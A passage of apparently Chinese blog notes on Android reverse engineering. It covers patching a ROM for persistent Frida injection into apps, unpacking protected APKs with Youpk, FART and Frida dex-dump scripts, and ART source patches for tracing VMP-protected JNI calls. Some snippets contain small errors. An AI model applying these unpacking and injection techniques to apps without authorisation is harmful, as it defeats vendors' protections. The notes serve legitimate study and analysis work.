16</p><p>/system/sepolicy/private/compat/28.0/28.0.ignore.cil 15</p><p>/system/sepolicy/prebuilts/api/29.0/private/compat/26.0/26.0.ignore.cil 17</p><p>/system/sepolicy/prebuilts/api/29.0/private/compat/27.0/27.0.ignore.cil 16</p><p>/system/sepolicy/prebuilts/api/29.0/private/compat/28.0/28.0.ignore.cil 15</p><p>在以上文件中加入标签名数据 xiaojianbang_file，两个文件添加的内容需要一致</p><p>2） You have tried to change the API from what has been previously released inan SDK.  Please fix the errors listed above</p><p>修改了代码以后，有些时候需要先 make update-api，再编译</p><h2 id="Frida持久化管理app的开发">Frida持久化管理app的开发</h2><p>工程名字：xjbPersistDemo</p><ol><li>管理app的功能<br>显示已安装app列表<br>可以对每个app指定需要注入的JS<br>可以设置是否启用持久化</li><li>相应功能实现原理<br>3.1 创建表示启用的文件/data/system/xsettings/xiaojianbang/persist/pkgName/xiaojianbang_persist       3.2 指定的JS文件复制到以下目录/data/system/xsettings/xiaojianbang/jscfg/pkgName/config.js<br>3.3 剩下的复制so、JS文件和加载so的操作，由魔改的doXiaojianbangPersist函数完成</li></ol><p><strong>system权限app开发</strong></p><p>1）创建的目录是system权限，所以app要有system权限：</p><ul><li><p>编写完工程在 manifest 中加入 android:sharedUserId=“android.uid.system”</p></li><li><p>编译生成apk文件，将编译出来的app放入/packages/apps/xiaojianbangPersist</p></li><li><p><a href="http://xn--Android-nu9ky494a.mk">编写Android.mk</a>，也放入该文件夹，内容为：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># // add</span></span><br><span class="line"><span class="comment"># 设置当前工作路径</span></span><br><span class="line">LOCAL_PATH:= <span class="variable">$(<span class="built_in">call</span> my-<span class="built_in">dir</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清除变量值</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(CLEAR_VARS)</span></span><br><span class="line"><span class="comment"># 生成的模块名称</span></span><br><span class="line">LOCAL_MODULE := ControlAPP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成的模块类型</span></span><br><span class="line">LOCAL_MODULE_CLASS := APPS</span><br><span class="line"><span class="comment"># 生成的模块后缀名,此处为apk</span></span><br><span class="line">LOCAL_MODULE_SUFFIX := <span class="variable">$(COMMON_ANDROID_PACKAGE_SUFFIX)</span></span><br><span class="line"><span class="comment"># 设置模块tag，tags取值可以为:user debug eng tests optional</span></span><br><span class="line"><span class="comment"># optional表示全平台编译</span></span><br><span class="line">LOCAL_MODULE_TAGS := optional</span><br><span class="line"></span><br><span class="line"><span class="comment"># LOCAL_PRIVILEGED_MODULE := true</span></span><br><span class="line"></span><br><span class="line">LOCAL_BUILT_MODULE_STEM := package.apk</span><br><span class="line"></span><br><span class="line">LOCAL_DEX_PREOPT := false</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置源文件</span></span><br><span class="line">LOCAL_SRC_FILES := <span class="variable">$(LOCAL_MODULE)</span>.apk</span><br><span class="line"></span><br><span class="line">LOCAL_CERTIFICATE := platform</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置签名，此处表示保持apk原有签名</span></span><br><span class="line"><span class="comment"># LOCAL_CERTIFICATE := PRESIGNED</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>单独编译指定模块 mmm packages/apps/xiaojianbangPersist</p></li><li><p>编译后的模块在 /out/target/product/sailfish/system/app/ControlAPP(app名字)</p></li><li><p>使用 make snod 将编译出来的文件打包成镜像，刷入system.img即可</p></li></ul><p>2）如果要在编译整个系统时，一起编译这个模块，需要将模块 ControlAPP 加入源码编译链</p><p>2.1 增加的内置模块，如果为APP，加入到如下文件中/build/make/target/product/handheld_product.mk</p><p>2.2 增加的内置模块，如果为可执行程序，加入到如下文件中/build/make/target/product/base_system.mk</p><h1>刷机</h1><p>简单补充刷机的一个注意点，当线刷运行.bat批处理文件时出现无法识别设备：</p><ul><li><p>安装Google USB驱动(Android Studio中即可下载)<img src="assets/image-20240125184838037.png" alt="image-20240125184838037"></p></li><li><p>此电脑-&gt;右键管理-&gt;设备管理器-&gt;选中没有驱动的android设备-&gt;右键更新驱动程序-&gt;选择浏览我的电脑找到刚才下载的驱动-&gt;确定安装</p></li></ul><h1>Youpk脱壳机</h1><p>参考：<a href="https://github.com/Youlor/Youpk">https://github.com/Youlor/Youpk</a></p><h2 id="刷机">刷机</h2><ul><li>重启至bootloader: <code>adb reboot bootloader</code></li><li>解压 Youpk_sailfish.zip 并双击 <code>flash-all.bat</code></li></ul><h2 id="使用方法">使用方法</h2><p>Youpk是一款针对Dex整体加固+各式各样的Dex抽取的脱壳机</p><p>1）配置待脱壳的app包名, 准确来讲是进程名称</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb <span class="keyword">shell</span><span class="language-bash"> <span class="string">&quot;echo 应用包名 &gt;&gt; /data/local/tmp/unpacker.config&quot;</span></span></span><br></pre></td></tr></table></figure><p>2）启动apk等待脱壳 每隔10秒将自动重新脱壳(已完全dump的dex将被忽略), 当日志打印unpack end时脱壳完成</p><p>pull出dump文件, dump文件路径为 <code>/data/data/包名/unpacker</code></p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">adb</span> pull /<span class="class"><span class="keyword">data</span>/<span class="keyword">data</span>/包名/unpacker</span></span><br></pre></td></tr></table></figure><p>3）调用修复工具 dexfixer.jar, 两个参数, 第一个为dump文件目录(unpacker，必须为有效路径), 第二个为重组后的DEX目录(不存在将会创建),合并.bin与.dex</p><p><code>java -jar dexfixer.jar /path/to/unpacker /path/to/output</code></p><h1>dump_dex.js脚本脱壳</h1><p><strong>这个只能脱壳有dex头的apk文件</strong></p><h2 id="使用方法-2">使用方法</h2><p>使用命令</p><p><code>frida -U -f 包名 -l dump_dex.js --no-pause</code>  进行脱壳</p><p>脱壳后的dex文件在/data/data/包名/files文件下</p><p>使用命令 adb pull 推送到手机</p><p>然后重命名 classes.dex，classes.dex2…</p><p>压缩成.zip文件拖入jadx-gui进行反编译</p><ul><li>在脱壳后可以使用py脚本打包成一个 命令 python merge_dex.py ./dex_path/ livedex</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># python3.7 merge_dex.py ./file/ livedex</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">3</span> :</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;start error&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    </span><br><span class="line">path = sys.argv[<span class="number">1</span>] <span class="comment">#文件夹目录</span></span><br><span class="line">files= os.listdir(path) <span class="comment">#得到文件夹下的所有文件名称</span></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> files: <span class="comment">#遍历文件夹</span></span><br><span class="line">    <span class="keyword">if</span> file.find(<span class="string">&quot;dex&quot;</span>) &gt; <span class="number">0</span>: <span class="comment">## 查找dex 文件</span></span><br><span class="line">        sh = <span class="string">&#x27;jadx -j 1 -r -d &#x27;</span> + sys.argv[<span class="number">2</span>] + <span class="string">&quot; &quot;</span> + path + file</span><br><span class="line">        <span class="built_in">print</span>(sh)</span><br><span class="line">        os.system(sh)</span><br></pre></td></tr></table></figure><p>然后拖入反编译工具当中，可能比把多个dex拖入jadx中反编译的要完整一些</p><h1>FART</h1><p>8.0</p><h2 id="FART框架">FART框架</h2><p>三个组件：脱壳组件 主动调用组件 修复组件</p><h2 id="dex2oat编译流程：函数粒度进行编译">dex2oat编译流程：函数粒度进行编译</h2><p>CompileMethod方法：是否对函数进行编译，不编译初始化函数 not <clinit><br>即并不是所有函数都被编译，因此对于当一个类被初始化时，该类初始化函数始终运行在interpreter模式(解释模式)</p><p>ART下函数执行模式：</p><p>interpreter模式：由ART下解释器解释执行<br>quick模式：直接运行dex2oat编译生成的arm指令</p><h2 id="脱壳点">脱壳点</h2><p>函数进入解释器解释执行之前会进入<strong>Execute</strong>函数</p><p>这个脱壳点好处：函数，初始化函数都会经过且execute是内联函数不易被hook</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Execute函数中添加如下代码：</span></span><br><span class="line">ArtMethod* artmethod=shadow_frame.<span class="built_in">GetMethod</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strstr</span>(artmethod-&gt;<span class="built_in">PrettyMethod</span>().<span class="built_in">c_str</span>(),<span class="string">&quot;&lt;clinit&gt;&quot;</span>))&#123; <span class="comment">//过滤 防止重复dump</span></span><br><span class="line">    <span class="type">const</span> DexFile* dexfile=artmethod-&gt;<span class="built_in">GetDexFile</span>();</span><br><span class="line">    <span class="type">const</span> <span class="type">uint8_t</span>* begin=dexfile-&gt;<span class="built_in">Begin</span>();</span><br><span class="line">    <span class="type">size_t</span> size=dexfile-&gt;<span class="built_in">Size</span>();</span><br><span class="line">    <span class="type">char</span> dexfilepath[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">sprintf</span>(dexfilepath,<span class="string">&quot;/sdcard/%d_%d Execute.dex&quot;</span>,(<span class="type">int</span>)size,<span class="built_in">getpid</span>());</span><br><span class="line">    <span class="type">int</span> fd=<span class="built_in">open</span>(dexfilepath,<span class="number">0</span> CREAT|<span class="number">0</span> RDWR,<span class="number">0666</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="type">int</span> number=<span class="built_in">write</span>(fd,begin,size);</span><br><span class="line">        <span class="keyword">if</span>(number&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">close</span>(fd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="FART-Frida">FART&amp;Frida</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对动态加载的dex 插件的dex进行主动调用(正常运行app不会被加载)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fartwithClassloader</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">loader</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(loader);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                   <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>).<span class="title function_">fartwithClassloader</span>(loader);     </span><br><span class="line">                &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                    conlose.<span class="title function_">log</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对dexclassloader实例主动调用</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fartwithClassloader</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;dalvik.system.DexClassLoader&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(instance);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                 <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>).<span class="title function_">fartwithClassloader</span>(instance);     </span><br><span class="line">                &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                    conlose.<span class="title function_">log</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;) </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主动调用某个类下所有方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//cn.cntv.ui.activity.SpringPlayerActivity 主动调用这个类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadoneclass</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="comment">//public static void loadClassAndInvoke   调用fart中这个函数即可实现</span></span><br><span class="line"><span class="comment">//(ClassLoader appClassloader, String eachclassname, Method dumpMethodCode_method)</span></span><br><span class="line"><span class="comment">//public static ClassLoader getClassloader()</span></span><br><span class="line">        <span class="keyword">var</span> appClassloader = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>).<span class="title function_">getClassloader</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;appClassloader-&gt;&quot;</span>, appClassloader); </span><br><span class="line">        <span class="comment">//dumpMethodCode</span></span><br><span class="line"><span class="comment">// private static native void dumpMethodCode(Object m);</span></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">DexFile</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;dalvik.system.DexFile&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Object</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Object&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> array = <span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&quot;java.lang.Class&quot;</span>, [<span class="title class_">Object</span>.<span class="property">class</span>]);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        var arry=[Java.use(&quot;java.lang.Object&quot;).class]</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> dumpMethodCode = <span class="title class_">DexFile</span>.<span class="property">class</span>.<span class="title function_">getDeclaredMethod</span>(<span class="string">&quot;dumpMethodCode&quot;</span>, array);</span><br><span class="line">        dumpMethodCode.<span class="title function_">setAccessible</span>(<span class="literal">true</span>); <span class="comment">//dumpMethodCode私有方法，取消检查</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;dumpMethodCode-&gt;&quot;</span>, dumpMethodCode);</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>).<span class="title function_">loadClassAndInvoke</span>(appClassloader, <span class="string">&quot;cn.cntv.ui.activity.SpringPlayerActivity&quot;</span>, dumpMethodCode);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>主动调用某个类下所有方法+配合frida ==》出现对抗<br>魔改fart系统：看雪3w–&gt;fart全自动脱壳–&gt;第九节  通过读配置文件classlist来调用dump</li></ul><h2 id="Frida版fart简单使用">Frida版fart简单使用</h2><p>github上下载py脚本</p><p>运行app，开启frida 注入这个脚本</p><p>然后输入：dumpclass(“要dump的类名”)</p><p>即可在/data/data/package路径下找到</p><h1>VMP</h1><h2 id="vmp保护的函数逻辑快速逆向分析方法">vmp保护的函数逻辑快速逆向分析方法</h2><h3 id="jnitrace使用">jnitrace使用</h3><p>命令：<code>jnitrace -l so文件名 package</code> 查找一个.so文件</p><p><code>jnitrace -l * package</code> 查找多个so</p><p><code>jnitrace -l * -i jni函数名 package</code> 查看某个函数的调用栈</p><p><code>jnitrace -l * -i ^Call package</code> 查看call开头函数</p><p><code>jnitrace -l * -i jni函数名 -b none package</code> 不打印backtrace 可加快效率</p><h3 id="定制沙箱跟踪vmp保护的函数逻辑">定制沙箱跟踪vmp保护的函数逻辑</h3><p>jni函数在进入前都会进入JNIMethodStart方法</p><p>在Android源码8.0中进行魔改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在InvokeWithArgArray中输出jni函数名  </span></span><br><span class="line">ArtMethod* artMethod = nullptr;</span><br><span class="line">Thread* self=Thread::Current();</span><br><span class="line">const ManagedStack* managedStack=self-&gt;GetManagedStack();</span><br><span class="line"><span class="keyword">if</span>(managedStack!=nullptr)&#123;</span><br><span class="line">    ArtMethod** tmpartmethod=managedStack-&gt;GetTopQuickFrame();</span><br><span class="line">    <span class="keyword">if</span>(tmpartmethod!=nullptr)&#123;</span><br><span class="line">        artMethod=*tmpartmethod；</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(artMethod!=nullptr)&#123;</span><br><span class="line">LOG(ERROR)&lt;&lt;<span class="string">&quot;[InvokeWithArgArray]before call caller:&quot;</span>&lt;&lt;artMethod-&gt;PrettyMethod()&lt;&lt;<span class="string">&quot;--called:&quot;</span>&lt;&lt;method-&gt;PrettyMethod(); </span><br><span class="line">&#125; </span><br><span class="line">method-&gt;Invoke(soa.Self(),args,arg_array-&gt;GetNumBytes(),result,shorty);</span><br><span class="line"><span class="keyword">if</span>(artMethod!=nullptr)&#123;</span><br><span class="line">    LOG(ERROR)&lt;&lt;<span class="string">&quot;[InvokeWithArgArray]after call caller:&quot;</span>&lt;&lt;artMethod-&gt;PrettyMethod()&lt;&lt;<span class="string">&quot;--called:&quot;</span>&lt;&lt;method-&gt;PrettyMethod(); </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因为上述沙箱方法会输出其他app的log打印，所以进行如下修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在InvokeWithArgArray中输出jni函数名  </span></span><br><span class="line">ArtMethod* artMethod = nullptr;</span><br><span class="line">Thread* self=Thread::Current();</span><br><span class="line">const ManagedStack* managedStack=self-&gt;GetManagedStack();</span><br><span class="line"><span class="keyword">if</span>(managedStack!=nullptr)&#123;</span><br><span class="line">    ArtMethod** tmpartmethod=managedStack-&gt;GetTopQuickFrame();</span><br><span class="line">    <span class="keyword">if</span>(tmpartmethod!=nullptr)&#123;</span><br><span class="line">        artMethod=*tmpartmethod；</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(artMethod!=nullptr)&#123;</span><br><span class="line">std::ostringstream oss;</span><br><span class="line">    oss &lt;&lt;<span class="string">&quot;[InvokeWithArgArray]before call caller:&quot;</span>&lt;&lt;artMethod-&gt;PrettyMethod()&lt;&lt;<span class="string">&quot;--called:&quot;</span>&lt;&lt;method-&gt;PrettyMethod();</span><br><span class="line">    <span class="keyword">if</span>(strstr(oss.str().c_str(),<span class="string">&quot;InvokeWithArgArrayBefore&quot;</span>))&#123;</span><br><span class="line">        LOG(ERROR)&lt;&lt;oss.str();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">method-&gt;Invoke(soa.Self(),args,arg_array-&gt;GetNumBytes(),result,shorty);</span><br><span class="line"><span class="keyword">if</span>(artMethod!=nullptr)&#123;</span><br><span class="line">   std::ostringstream oss;</span><br><span class="line">    oss &lt;&lt;<span class="string">&quot;[InvokeWithArgArray]after call caller:&quot;</span>&lt;&lt;artMethod-&gt;PrettyMethod()&lt;&lt;<span class="string">&quot;--called:&quot;</span>&lt;&lt;method-&gt;PrettyMethod();</span><br><span class="line">    <span class="keyword">if</span>(strstr(oss.str().c_str(),<span class="string">&quot;InvokeWithArgArrayAfter&quot;</span>))&#123;</span><br><span class="line">        LOG(ERROR)&lt;&lt;oss.str();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//对地址绑定 RegisterNative源码中添加，打印地址</span></span><br><span class="line">std::ostringstream oss;</span><br><span class="line">oss &lt;&lt;<span class="string">&quot;[ArtMethod::RegisterNative]jni Method:&quot;</span>&lt;&lt;<span class="built_in">this</span>-&gt;PrettyMethod()&lt;&lt;<span class="string">&quot;---addr:&quot;</span>&lt;&lt;native_method;</span><br><span class="line"><span class="keyword">if</span>(strstr(oss.str().c_str(),<span class="string">&quot;RegisterNativeFlag&quot;</span>))&#123;</span><br><span class="line">    LOG(ERROR)&lt;&lt;oss.str();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//对strstr函数进行hook就可以获得有意义的字符串</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<h1>Arm与c/c++逆向</h1><h2 id="Arm">Arm</h2><p>ndk下面有clang，进行预处理–编译–汇编–链接</p><p>进入ndk文件夹，通过<code>find . -name clang</code>找到clang路径，进入后可以<code>./clang --version</code>查看版本信息</p><p>把clang放入系统变量 <code>export PATH=~/re-tools/android-ndk-r26b/toolchains/llvm/prebuilt/linux-x86_64/bin:$PATH</code></p><p>安装vscode <code>dpkg -i deb包</code></p><p>arm32有16个通用寄存器：r0-r12，和其他三个 SP,LR,PC</p><p>arm64有31个通用寄存器：x0-x30/w0-w30<img src="assets/image-20240429213931083.png" alt="image-20240429213931083"></p><h3 id="arm可执行文件生成过程">arm可执行文件生成过程</h3><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将我们的文件编译成ARMv5架构的文件（32位）</span></span><br><span class="line">clang -<span class="keyword">target</span> armv-linux-android21 demo.c -o demo</span><br><span class="line"></span><br><span class="line"><span class="comment">//将我们的文件编译成ARMv7-A架构的文件 (32位)</span></span><br><span class="line">clang -<span class="keyword">target</span> armv7a-linux-android21 demo.c -o demo</span><br><span class="line"></span><br><span class="line"><span class="comment">//将我们的文件编译成AArch64 架构的文件（64位）</span></span><br><span class="line">clang -<span class="keyword">target</span> aarch64-linux-android21 <span class="number">1.</span>cpp -o demo</span><br><span class="line"></span><br><span class="line"><span class="comment">//clang编译thumb架构的文件</span></span><br><span class="line">clang -<span class="keyword">target</span> arm-linux-android21 -S -mthumb demo.c -o demo.s</span><br></pre></td></tr></table></figure><ul><li>预处理<br><code>clang -target armv7a-linux-androideabi29 -E hello.c -o hello.i</code></li><li>编译<br><code>clang -target armv7a-linux-androideabi29 -S hello.i -o hello.s</code></li><li>汇编<br><code>clang -target armv7a-linux-androideabi29 -c hello.s -o hello.o</code> ELF结构  不能直接手机运行</li><li>链接<br><code>clang -target armv7a-linux-androideabi29  hello.o -o hello</code></li><li>将一个.c编译为so动态库<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//clang -target armv7a-linux-androideabi29 a.c -fPIC -shared -o liba.so</span></span><br><span class="line"><span class="comment">//clang -target armv7a-linux-androideabi29 hello.c -L. -la -Wl, -rpath,./ -o hello</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//其中代码如下：</span></span><br><span class="line"><span class="comment">//hello.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;a.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> <span class="type">const</span> *argv[])</span>&#123;</span><br><span class="line">    <span class="type">int</span> a=add(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="type">int</span> s=sub(<span class="number">2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;i am from main %d %d\n&quot;</span>,a,s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 